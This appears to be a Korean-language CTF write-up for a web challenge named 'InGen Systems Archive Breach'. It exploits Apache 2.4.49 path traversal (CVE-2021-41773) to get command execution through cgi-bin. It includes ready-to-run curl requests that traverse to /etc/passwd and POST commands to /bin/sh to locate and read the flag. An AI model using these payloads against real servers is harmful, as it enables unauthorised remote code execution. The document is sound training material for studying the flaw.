---
ctf_name: "RIFFHACK 2026: Black Market Break-In"
challenge_name: "InGen Systems Archive Breach"
category: "web"           # web / pwn / rev / crypto / misc
difficulty: "medium"      # easy / medium / hard / insane
author: "laneeeey"
date: "2026-06-20"
points: 250
tags: [apache, cgi]
---
# 문제명

## 문제 설명

> InGen Systems has brought their dinosaur research archives online. The island's legacy web infrastructure hosts a public-facing specimen catalogue. Something about the way old URLs are resolved makes Dr. Malcolm uneasy. Life finds a way out of any cage.

- 문제 URL
http://144.126.234.248/

## 풀이

### 분석

문제 페이지에 접속하면 InGen Systems의 표본 카탈로그 페이지가 나온다.
페이지에는 공룡 표본 목록과 함께 다음과 같은 문구가 있었다.

Isla Nublar Research Archive — Species Catalogue v4.49

하단에는 다음과 같은 설명이 있었다.
Genome sequence lookups and specimen health telemetry are available through the research CGI interface.

여기서 중요한 단서는 두 가지다.

첫 번째는 v4.49이다. 단순한 카탈로그 버전처럼 보이지만, 웹 서버 버전인 Apache 2.4.49를 암시하는 힌트로 볼 수 있다.

두 번째는 CGI interface이다. CGI가 활성화된 환경에서는 단순 파일 조회 취약점이 명령 실행 취약점으로 이어질 수 있다.

실제로 curl을 이용해 응답 헤더를 확인했다.

curl -i http://144.126.234.248/

응답 헤더에서 다음 내용을 확인할 수 있었다.

Server: Apache/2.4.49 (Unix)

Apache 2.4.49는 CVE-2021-41773 취약점이 존재하는 버전이다. 따라서 이 문제는 Apache 2.4.49의 path traversal 취약점과 CGI 실행 환경을 조합하는 문제로 판단했다.
### 취약점

이 문제의 핵심 취약점은 Apache 2.4.49의 path traversal 및 CGI RCE이다.

Apache 2.4.49에서는 URL 경로 정규화 처리 문제로 인해 인코딩된 상위 디렉터리 이동 구문을 우회할 수 있다.

일반적인 ../ 대신 .%2e/로 인코딩된 경로를 사용할 수 있다.

따라서 /cgi-bin/ 뒤에 .%2e/를 여러 번 붙이면 웹 루트 밖의 경로로 이동할 수 있다.

먼저 /etc/passwd 파일 접근을 시도했다.

curl --path-as-is -i \
'http://144.126.234.248/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'

결과는 다음과 같이 500 Internal Server Error였다.

HTTP/1.1 500 Internal Server Error
Server: Apache/2.4.49 (Unix)

처음에는 실패처럼 보였지만 이 요청은 일반 파일을 정적으로 읽는 방식이 아니라 /cgi-bin/ 경로를 통해 실행하려는 방식으로 처리된다.

/etc/passwd는 실행 가능한 CGI 스크립트가 아니기 때문에 500 에러가 발생한 것으로 볼 수 있다. 이 결과는 오히려 path traversal이 CGI 경로 안에서 처리되고 있다는 단서가 된다.

CGI 경로를 통해 실행 가능한 바이너리인 /bin/sh에 접근하면 명령 실행이 가능할 것으로 판단했다.

### 익스플로잇

먼저 /bin/sh를 CGI처럼 호출하여 명령 실행 여부를 확인했다.

curl --path-as-is -s -X POST \
'http://144.126.234.248/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \
--data-binary $'echo Content-Type: text/plain; echo; id'

CGI 응답 형식을 맞추기 위해 먼저 다음 헤더를 출력했다.

echo Content-Type: text/plain
echo

그 뒤에 실행할 명령어인 id를 전달했다.

명령 실행이 성공하면 현재 웹 서버 프로세스의 사용자 정보가 출력된다. 이를 통해 서버에서 명령 실행이 가능함을 확인할 수 있다.

이후 flag 파일의 위치를 찾기 위해 find 명령을 실행했다.

curl --path-as-is -s -X POST \
'http://144.126.234.248/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \
--data-binary $'echo Content-Type: text/plain; echo; find / -name "*flag*" 2>/dev/null'

출력 결과에서 다음 경로를 확인할 수 있었다.

/opt/ingen/flag.txt

마지막으로 해당 파일을 읽었다.

curl --path-as-is -s -X POST \
'http://144.126.234.248/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \
--data-binary $'echo Content-Type: text/plain; echo; cat /opt/ingen/flag.txt'

이를 통해 flag를 획득할 수 있었다.

## 플래그

```
flag{REDACTED}
```

## 배운 점

- 확인한 버전을 기준으로 관련 CVE를 찾아보며 CVE-2021-41773을 의심할 수 있었다.
- 에러 응답도 단순 실패가 아니라 공격 흐름을 파악하는 단서가 될 수 있다.